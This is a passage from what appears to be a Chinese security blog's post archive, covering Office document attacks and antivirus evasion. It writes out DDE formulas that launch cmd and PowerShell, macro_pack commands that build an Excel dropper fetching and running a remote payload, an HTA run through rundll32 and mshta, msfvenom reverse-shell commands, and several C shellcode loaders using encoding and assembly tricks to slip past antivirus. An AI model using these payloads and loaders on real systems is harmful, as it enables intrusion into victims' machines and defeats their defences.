class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd.exe/c powershell c:/windows/system32/calc.exe</span><br></pre></td></tr></table></figure><p>当然，也可以使用字符串拼接的特性，将命令变为下面这样：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">=MSEXCEL|&#x27;\..\..\..\Windows\System32\cmd.exe /c REM.&amp;&amp;@p^o^w^e^r^s^h^e^l^l c:/*/*2/?al?.?x?&quot;&#x27;!_xlbgnm.A1</span><br></pre></td></tr></table></figure><p>msf也集成了这种攻击方式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/fileformat/office_dde_delivery</span><br></pre></td></tr></table></figure><h2 id="3-power-query-DDE"><a href="#3-power-query-DDE" class="headerlink" title="3.power query DDE"></a>3.power query DDE</h2><p>如其名,DDE的一种。Power Query是微软Excel中一个强大的工具，利用该工具的漏洞可以远程执行嵌入的恶意payload。</p><p>Power Query ：<a href="https://support.microsoft.com/zh-cn/office/power-query-%E5%85%A5%E9%97%A8-7104fbee-9e62-4cb9-a02e-5bfb1a6c536a">https://support.microsoft.com/zh-cn/office/power-query-%E5%85%A5%E9%97%A8-7104fbee-9e62-4cb9-a02e-5bfb1a6c536a</a></p><p>Power Query特征可以使攻击者很容易并动态地嵌入远程内容。这种攻击很难检测，而且攻击者有更多的机会来入侵受害者机器。利用Power Query中的潜在漏洞，攻击者可以将恶意内容嵌入到payload中，但恶意内容本身并不会下载。</p><p><a href="https://xz.aliyun.com/t/5514">https://xz.aliyun.com/t/5514</a></p><h2 id="4-DDE-宏-lolbin"><a href="#4-DDE-宏-lolbin" class="headerlink" title="4.DDE + 宏+lolbin"></a>4.DDE + 宏+lolbin</h2><p>具体的思路如下：使用宏远程下载一个hta文件，然后依靠dde加载该hta，hta为一个启动mshta的恶意程序。</p><p>首先，我们要建立一个使用宏远程下载的excel文件，如果会vbs的话可以自己进行编写，如果不会的话可以使用macro_pack进行辅助</p><p>macro_pack：<a href="https://github.com/sevagas/macro_pack">https://github.com/sevagas/macro_pack</a></p><p>macro_pack windows程序：<a href="https://github.com/sevagas/macro_pack/releases/">https://github.com/sevagas/macro_pack/releases/</a></p><p>我们的目的是使用它生成一个具有下载功能的excel。我们可以使用下面的方法进行生成：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;https://myurl.url/payload.exe&quot; &quot;dropped.exe&quot; |  macro_pack.exe -t DROPPER -G &quot;drop.xls&quot;</span><br><span class="line">#https://myurl.url/payload.exe：恶意程序的地址</span><br><span class="line">#dropped.exe：恶意程序下载下来保存的文件名</span><br><span class="line">#drop.xls：生成的excel表格名</span><br></pre></td></tr></table></figure><p>打开drop.xls，启用宏，就会自动下载url的payload.exe,并保存为dropped.exe，然后执行，msf上线。</p><p>但是我们要做到免杀，就不要求它进行执行，所以需要对宏代码做一定的修改：</p><p><img src="image-20210129015545405.png" alt="image-20210129015545405"></p><p>将里面的ExecuteCmdAsync downloadPath给删除掉，并删除其构造代码，然后更改下载路径为你自己想要的路径，服务器地址为你的地址即可。</p><p>然后我们此时打开该文档，就会提示我们运行宏，我们允许，则会在我们刚才设置的地方下载好我们的hta文件。然后我们将宏代码保存为vba文件，使用下面的命令将其混淆：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">macro_pack.exe -f xxx.vba -o -G xxx.xls</span><br></pre></td></tr></table></figure><p>然后将宏代码保存为vba文件，使用下面的命令将其混淆：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">macro_pack.exe -f xxx.vba -o -G xxx.xls</span><br></pre></td></tr></table></figure><p>然后我们下面就需要调用我们的hta文件了。我们说过了，要使用dde，我们这里就使用dde去调用rundll32.exe去运行我们的hta文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">=MSEXCEL|&#x27;\..\..\..\Windows\System32\rundll32.exe url.dll,FileProtocolHandler  c:\temp\payload.hta&#x27;!_xlbgnm.A1</span><br></pre></td></tr></table></figure><p><img src="image-20210129021101468.png" alt="image-20210129021101468"></p><p>有关rundll32具体信息请访问：<a href="https://support.microsoft.com/sk-sk/help/164787/info-windows-rundll-and-rundll32-interface">https://support.microsoft.com/sk-sk/help/164787/info-windows-rundll-and-rundll32-interface</a></p><p>比如当前我们的hta内容如下，那么将执行内部代码弹出计算器.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;HTML&gt; </span><br><span class="line">&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot;&gt;</span><br><span class="line">&lt;HEAD&gt; </span><br><span class="line">&lt;script language=&quot;VBScript&quot;&gt;</span><br><span class="line">Window.ReSizeTo 0, 0</span><br><span class="line">Window.moveTo -2000,-2000</span><br><span class="line">Set objShell = CreateObject(&quot;Wscript.Shell&quot;)</span><br><span class="line">objShell.Run &quot;calc.exe&quot;</span><br><span class="line">self.close</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/HEAD&gt; </span><br><span class="line">&lt;/HTML&gt;</span><br></pre></td></tr></table></figure><p>但是，仅仅这样还是不够的我们还需要其他的，我们接下来再使用攻击中常见的一种手法，mshta攻击，用法如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mshta.exe payload地址</span><br></pre></td></tr></table></figure><p>首先使用msf开启监听，然后将这里：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Set objShell = CreateObject(&quot;Wscript.Shell&quot;)</span><br><span class="line">objShell.Run &quot;calc.exe&quot;</span><br></pre></td></tr></table></figure><p>改成mshta的利用语句并混淆，目标运行，成功上线：</p><p><a href="https://lengjibo.github.io/execl/">https://lengjibo.github.io/execl/</a></p><p><a href="https://mp.weixin.qq.com/s/lhg71lVHfp9PY1m8sYXA_A">https://mp.weixin.qq.com/s/lhg71lVHfp9PY1m8sYXA_A</a></p><p>  <a href="https://app.any.run/submissions">https://app.any.run/submissions</a> </p><p><a href="https://www.freebuf.com/articles/network/170074.html">https://www.freebuf.com/articles/network/170074.html</a></p>]]></content>
      
      
      <categories>
          
          <category> 内网安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> office宏攻击  </tag>
            
            <tag> DDE </tag>
            
            <tag> power query DDE </tag>
            
            <tag> DDE + 宏+lolbin </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>免杀二-脚本语言免杀</title>
      <link href="/2020/10/04/%E5%85%8D%E6%9D%80%E4%BA%8C-%E8%84%9A%E6%9C%AC%E8%AF%AD%E8%A8%80%E5%85%8D%E6%9D%80/"/>
      <url>/2020/10/04/%E5%85%8D%E6%9D%80%E4%BA%8C-%E8%84%9A%E6%9C%AC%E8%AF%AD%E8%A8%80%E5%85%8D%E6%9D%80/</url>
      
        <content type="html"><![CDATA[<p>本文介绍C&#x2F;C++、python、C#、powershell、go五种语言的常见的免杀方法</p><span id="more"></span><h2 id="1-c-c"><a href="#1-c-c" class="headerlink" title="1.c&#x2F;c++"></a>1.c&#x2F;c++</h2><h3 id="1-源码编译（VT-24-70，过360和微软）"><a href="#1-源码编译（VT-24-70，过360和微软）" class="headerlink" title="1.源码编译（VT:24&#x2F;70，过360和微软）"></a>1.源码编译（VT:24&#x2F;70，过360和微软）</h3><h4 id="1-指针执行"><a href="#1-指针执行" class="headerlink" title="1.指针执行"></a>1.指针执行</h4><p>msf生成shellcode</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p  windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 6 -b &#x27;\x00&#x27; lhost=192.168.3.28 lport=3333  -f c -o shell.c</span><br></pre></td></tr></table></figure><p>vs2019编译生成的shellcode</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">unsigned char buf[] =</span><br><span class="line"></span><br><span class="line">&quot;shellcode&quot;;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">  #</span><span class="language-bash">pragma comment(linker, <span class="string">&quot;/section:.data,RWE&quot;</span>)</span></span><br><span class="line">    main()</span><br><span class="line">    &#123;</span><br><span class="line">        ( (void(*)(void))&amp;buf)();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>在vs中选择debug，生成-生成project，生成的文件在debug目录下。</p><p>运行生成的exe，msf设置上线即可</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set LHOST 192.168.3.30</span><br><span class="line">set LPORT 3333</span><br></pre></td></tr></table></figure><h4 id="2-申请动态内存加载（VT-26-69，过360）"><a href="#2-申请动态内存加载（VT-26-69，过360）" class="headerlink" title="2.申请动态内存加载（VT:26&#x2F;69，过360）"></a>2.申请动态内存加载（VT:26&#x2F;69，过360）</h4><p>下面的代码会申请一段动态内存，然后加载shellcode。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">include &lt;Windows.h&gt;</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">include &lt;string.h&gt;</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">pragma comment(linker,<span class="string">&quot;/subsystem:\&quot;Windows\&quot; /entry:\&quot;mainCRTStartup\&quot;&quot;</span>) //windows控制台程序不出黑窗口</span></span><br><span class="line"></span><br><span class="line">unsigned char buf[] =</span><br><span class="line">&quot;shellcode&quot;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">main()</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    char *Memory;</span><br><span class="line"></span><br><span class="line">    Memory=VirtualAlloc(NULL, sizeof(buf), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class="line"></span><br><span class="line">    memcpy(Memory, buf, sizeof(buf));</span><br><span class="line"></span><br><span class="line">    ((void(*)())Memory)();</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>操作和方法一一样。</p><h4 id="3-嵌入汇编加载（VT-23-70-）"><a href="#3-嵌入汇编加载（VT-23-70-）" class="headerlink" title="3.嵌入汇编加载（VT:23&#x2F;70 ）"></a>3.嵌入汇编加载（VT:23&#x2F;70 ）</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">include &lt;windows.h&gt;</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">pragma comment(linker, <span class="string">&quot;/section:.data,RWE&quot;</span>)</span></span><br><span class="line">unsigned char shellcode[] =&quot;&quot;;</span><br><span class="line"></span><br><span class="line">void main()</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">        __asm</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        mov eax, offset shellcode</span><br><span class="line">        jmp eax</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="4-强制类型转换"><a href="#4-强制类型转换" class="headerlink" title="4.强制类型转换"></a>4.强制类型转换</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;windows.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#pragma comment(linker, &quot;/section:.data,RWE&quot;)</span><br><span class="line">unsigned char buf[] =&quot;&quot;;</span><br><span class="line"></span><br><span class="line">void main()</span><br><span class="line">&#123;</span><br><span class="line">   ((void(WINAPI*)(void))&amp;buf)();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="5-汇编花指令"><a href="#5-汇编花指令" class="headerlink" title="5.汇编花指令"></a>5.汇编花指令</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;windows.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#pragma comment(linker, &quot;/section:.data,RWE&quot;)</span><br><span class="line">unsigned char shellcode[] =&quot;&quot;;</span><br><span class="line"></span><br><span class="line">void main()</span><br><span class="line">&#123;</span><br><span class="line">        __asm</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        mov eax, offset shellcode</span><br><span class="line">        _emit 0xFF  </span><br><span class="line">        _emit 0xE0</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="6-XOR加密-VT-23-70"><a href="#6-XOR加密-VT-23-70" class="headerlink" title="6.XOR加密(VT:23&#x2F;70 )"></a>6.XOR加密(VT:23&#x2F;70 )</h4><p>msf生成raw格式的shellcode</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p  windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 6 -b &#x27;\x00&#x27; lhost=192.168.3.30 lport=3333  -f raw &gt; shellcode.raw</span><br></pre></td></tr></table></figure><p>在<code>ShellcodeWrapper</code>文件夹中执行下面命令，其中<code>/root/shellcode.raw</code>为msf生成的raw文件，<code>se_nell</code>为自己设置的key。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python shellcode_encoder.py -cpp /root/shellcode.raw se_null xor</span><br></pre></td></tr></table></figure><p>在vs2019中将上述几个实验的源码打开，源文件下的test.c改为test.cpp，粘贴<code>ShellcodeWrapper</code>生成的cpp文件，位置在<code>ShellcodeWrapper/ShellcodeWrapper/result/</code>下，debug生成project，执行即可，msf可上线，但是会出现弹窗。（注意生成的cpp文件第一行<code>#include &quot;stdafx.h&quot;</code>删除再生成project文件。）</p><h4 id="7-base64加密法"><a href="#7-base64加密法" class="headerlink" title="7.base64加密法"></a>7.base64加密法</h4><p><strong>方法一</strong></p><p>msf生成base64编码的shellcode</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p  windows/meterpreter/reverse_tcp --encrypt base64  lhost=192.168.3.30 lport=3333  -f c &gt; shell.c</span><br></pre></td></tr></table></figure><p>将<code>shell.c</code>的内容复制到一下文件中，命名为<code>shellcode.c</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">include &lt;Windows.h&gt;</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">include &lt;string.h&gt;</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">include <span class="string">&quot;base64.h&quot;</span></span></span><br><span class="line"></span><br><span class="line">unsigned char buf[] =</span><br><span class="line">&quot;msf base64 code here&quot;;</span><br><span class="line"></span><br><span class="line">int main(int argc, const char * argv[]) &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    char str1[1000] = &#123; 0 &#125;;</span><br><span class="line">    Base64decode(str1, buf);</span><br><span class="line"></span><br><span class="line">    //printf(&quot;%d  &quot;, sizeof(str3));</span><br><span class="line">    char *Memory;</span><br><span class="line">    Memory = VirtualAlloc(NULL, sizeof(str1), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class="line">    memcpy(Memory, str1, sizeof(str1));</span><br><span class="line">    ((void(*)())Memory)();</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>另外需准备base64.c文件，内容如下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></td><td class="code"><pre><span class="line">/* Base64 encoder/decoder. Originally Apache file ap_base64.c</span><br><span class="line">*/</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">include &lt;string.h&gt;</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">include <span class="string">&quot;base64.h&quot;</span></span></span><br><span class="line"></span><br><span class="line">/* aaaack but it&#x27;s fast and const should make it shared text page. */</span><br><span class="line">static const unsigned char pr2six[256] =</span><br><span class="line">&#123;</span><br><span class="line">    /* ASCII table */</span><br><span class="line">    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,</span><br><span class="line">    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,</span><br><span class="line">    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 62, 64, 64, 64, 63,</span><br><span class="line">    52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 64, 64, 64, 64, 64, 64,</span><br><span class="line">    64,  0,  1,  2,  3,  4,  5,  6,  7,  8,  9, 10, 11, 12, 13, 14,</span><br><span class="line">    15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 64, 64, 64, 64, 64,</span><br><span class="line">    64, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40,</span><br><span class="line">    41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 64, 64, 64, 64, 64,</span><br><span class="line">    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,</span><br><span class="line">    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,</span><br><span class="line">    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,</span><br><span class="line">    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,</span><br><span class="line">    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,</span><br><span class="line">    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,</span><br><span class="line">    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,</span><br><span class="line">    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">int Base64decode_len(const char *bufcoded)</span><br><span class="line">&#123;</span><br><span class="line">    int nbytesdecoded;</span><br><span class="line">    register const unsigned char *bufin;</span><br><span class="line">    register int nprbytes;</span><br><span class="line"></span><br><span class="line">    bufin = (const unsigned char *)bufcoded;</span><br><span class="line">    while (pr2six[*(bufin++)] &lt;= 63);</span><br><span class="line"></span><br><span class="line">    nprbytes = (bufin - (const unsigned char *)bufcoded) - 1;</span><br><span class="line">    nbytesdecoded = ((nprbytes + 3) / 4) * 3;</span><br><span class="line"></span><br><span class="line">    return nbytesdecoded + 1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int Base64decode(char *bufplain, const char *bufcoded)</span><br><span class="line">&#123;</span><br><span class="line">    int nbytesdecoded;</span><br><span class="line">    register const unsigned char *bufin;</span><br><span class="line">    register unsigned char *bufout;</span><br><span class="line">    register int nprbytes;</span><br><span class="line"></span><br><span class="line">    bufin = (const unsigned char *)bufcoded;</span><br><span class="line">    while (pr2six[*(bufin++)] &lt;= 63);</span><br><span class="line">    nprbytes = (bufin - (const unsigned char *)bufcoded) - 1;</span><br><span class="line">    nbytesdecoded = ((nprbytes + 3) / 4) * 3;</span><br><span class="line"></span><br><span class="line">    bufout = (unsigned char *)bufplain;</span><br><span class="line">    bufin = (const unsigned char *)bufcoded;</span><br><span class="line"></span><br><span class="line">    while (nprbytes &gt; 4) &#123;</span><br><span class="line">        *(bufout++) =</span><br><span class="line">            (unsigned char)(pr2six[*bufin] &lt;&lt; 2 | pr2six[bufin[1]] &gt;&gt; 4);</span><br><span class="line">        *(bufout++) =</span><br><span class="line">            (unsigned char)(pr2six[bufin[1]] &lt;&lt; 4 | pr2six[bufin[2]] &gt;&gt; 2);</span><br><span class="line">        *(bufout++) =</span><br><span class="line">            (unsigned char)(pr2six[bufin[2]] &lt;&lt; 6 | pr2six[bufin[3]]);</span><br><span class="line">        bufin += 4;</span><br><span class="line">        nprbytes -= 4;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /* Note: (nprbytes == 1) would be an error, so just ingore that case */</span><br><span class="line">    if (nprbytes &gt; 1) &#123;</span><br><span class="line">        *(bufout++) =</span><br><span class="line">            (unsigned char)(pr2six[*bufin] &lt;&lt; 2 | pr2six[bufin[1]] &gt;&gt; 4);</span><br><span class="line">    &#125;</span><br><span class="line">    if (nprbytes &gt; 2) &#123;</span><br><span class="line">        *(bufout++) =</span><br><span class="line">            (unsigned char)(pr2six[bufin[1]] &lt;&lt; 4 | pr2six[bufin[2]] &gt;&gt; 2);</span><br><span class="line">    &#125;</span><br><span class="line">    if (nprbytes &gt; 3) &#123;</span><br><span class="line">        *(bufout++) =</span><br><span class="line">            (unsigned char)(pr2six[bufin[2]] &lt;&lt; 6 | pr2six[bufin[3]]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    *(bufout++) = &#x27;\0&#x27;;</span><br><span class="line">    nbytesdecoded -= (4 - nprbytes) &amp; 3;</span><br><span class="line">    return nbytesdecoded;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">static const char basis_64[] =</span><br><span class="line">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;;</span><br><span class="line"></span><br><span class="line">int Base64encode_len(int len)</span><br><span class="line">&#123;</span><br><span class="line">    return ((len + 2) / 3 * 4) + 1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int Base64encode(char *encoded, const char *string, int len)</span><br><span class="line">&#123;</span><br><span class="line">    int i;</span><br><span class="line">    char *p;</span><br><span class="line"></span><br><span class="line">    p = encoded;</span><br><span class="line">    for (i = 0; i &lt; len - 2; i += 3) &#123;</span><br><span class="line">        *p++ = basis_64[(string[i] &gt;&gt; 2) &amp; 0x3F];</span><br><span class="line">        *p++ = basis_64[((string[i] &amp; 0x3) &lt;&lt; 4) |</span><br><span class="line">            ((int)(string[i + 1] &amp; 0xF0) &gt;&gt; 4)];</span><br><span class="line">        *p++ = basis_64[((string[i + 1] &amp; 0xF) &lt;&lt; 2) |</span><br><span class="line">            ((int)(string[i + 2] &amp; 0xC0) &gt;&gt; 6)];</span><br><span class="line">        *p++ = basis_64[string[i + 2] &amp; 0x3F];</span><br><span class="line">    &#125;</span><br><span class="line">    if (i &lt; len) &#123;</span><br><span class="line">        *p++ = basis_64[(string[i] &gt;&gt; 2) &amp; 0x3F];</span><br><span class="line">        if (i == (len - 1)) &#123;</span><br><span class="line">            *p++ = basis_64[((string[i] &amp; 0x3) &lt;&lt; 4)];</span><br><span class="line">            //    *p++ = &#x27;=&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line">        else &#123;</span><br><span class="line">            *p++ = basis_64[((string[i] &amp; 0x3) &lt;&lt; 4) |</span><br><span class="line">                ((int)(string[i + 1] &amp; 0xF0) &gt;&gt; 4)];</span><br><span class="line">            *p++ = basis_64[((string[i + 1] &amp; 0xF) &lt;&lt; 2)];</span><br><span class="line">        &#125;</span><br><span class="line">        //*p++ = &#x27;=&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    *p++ = &#x27;\0&#x27;;</span><br><span class="line">    return p - encoded;</span><br><span 